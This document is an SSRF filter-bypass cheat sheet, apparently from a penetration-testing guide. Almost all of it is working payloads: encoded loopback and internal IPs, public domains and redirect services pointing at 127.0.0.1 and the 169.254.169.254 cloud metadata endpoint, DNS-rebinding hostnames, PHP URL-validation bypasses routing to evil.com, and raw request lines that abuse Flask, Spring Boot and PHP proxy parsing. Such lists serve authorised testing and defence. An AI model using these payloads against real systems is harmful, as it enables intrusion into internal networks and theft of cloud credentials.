# SSRF filter-bypass strings (IP encodings, rebinding, redirect, allowlist-host confusion) — Open WHEN: a confirmed SSRF sink rejects/blocks your loopback or internal-IP test input and you need encoded/host-confusion variants

Body has the canonical single forms (`2130706433`, `0x7f000001`, `0177.0.0.1`,
`[::ffff:127.0.0.1]`, parser-differential `\@`). Below = the EXTRA enumerated forms.

## Rare / short-hand loopback (drop the zeros)
```
http://0/                 # 0.0.0.0 -> loopback on many stacks
http://0.0.0.0:80
http://127.1             # = 127.0.0.1
http://127.0.1           # = 127.0.0.1
http://127.127.127.127   # whole 127.0.0.0/8 is loopback
http://127.0.1.3
http://[::]:80/          # IPv6 unspecified
http://[0000::1]:80/     # IPv6 loopback padded
http://[0:0:0:0:0:ffff:127.0.0.1]
http://ip6-localhost     # = ::1 (only if server binds IPv6)
http://ip6-loopback      # = ::1
```

## Decimal IPs (full table — not in body)
```
http://2130706433/  = 127.0.0.1
http://3232235521/  = 192.168.0.1
http://3232235777/  = 192.168.1.1
http://2852039166/  = 169.254.169.254   # AWS/Azure metadata in decimal
```

## Hex IPs (dotless — needed for PHP `*@` proxy trick)
```
http://0x7f000001   = 127.0.0.1
http://0xc0a80101   = 192.168.1.1
http://0xa9fea9fe   = 169.254.169.254
```

## Octal variants (parsers disagree on prefix)
```
http://0177.0.0.1/    http://o177.0.0.1/
http://0o177.0.0.1/   http://q177.0.0.1/     # all -> 127.0.0.1
```

## Encoding / charset tricks
```
http://127.0.0.1/%61dmin     # single URL-encode path
http://127.0.0.1/%2561dmin   # double URL-encode (beats one decode pass)
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ         # enclosed-alphanumeric -> example.com
# .NET/Python3 regex \d also matches Thai digits ๐๑๒๓๔๕๖๗๘๙ in IP octets
```

## Allowlist-host confusion (public name that resolves internal)
nip.io maps `<anything>.<IP>.nip.io` -> `<IP>`, even loopback.
```
localtest.me                  -> ::1
localh.st                     -> 127.0.0.1
company.127.0.0.1.nip.io      -> 127.0.0.1
spoofed.<your-oast>.oastify.com  -> 127.0.0.1   # CNAME a host under an allowed parent domain
```

## Redirect-as-a-service (no need to host your own redirector — r3dir)
Use HTTP 307/308 to keep method+body across the hop.
```
https://307.r3dir.me/--to/?url=http://localhost
https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/
# <base32(target)>.302.r3dir.me  -> 302 to your target
```

## DNS rebinding domain syntax (1u.ms — rotates two IPs per lookup)
```
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms   # flips 1.2.3.4 <-> 169.254.169.254
# verify with: nslookup <name>  (run twice, watch the address change)
```

## PHP filter_var(FILTER_VALIDATE_URL) accepted-but-malicious
```
http://test???test.com
0://evil.com:80;http://google.com:80/      # allowlist sees google, fetcher hits evil
```

## jar: scheme (fully blind — no response visible)
```
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

## curl URL globbing (WAF/path-traversal bypass when fetcher is curl)
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```

## Misconfigured-proxy parser tricks (set request line, not a url= param)
Flask proxy treats leading `@` host as username, injects new host:
```
GET @evildomain.com/ HTTP/1.1
Host: target.com
```
Spring Boot — start path with `;` then `@host`:
```
GET ;@evil.com/url HTTP/1.1
Host: target.com
```
PHP built-in server — `*` before slash, dotless-hex IP only:
```
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
```
Open forward-proxy (reverse proxy accepts absolute-form request line):
```
GET http://127.0.0.1:8080/ HTTP/1.1
Host: whatever
```
If you get the upstream body instead of 400, it is a full-read SSRF proxy.
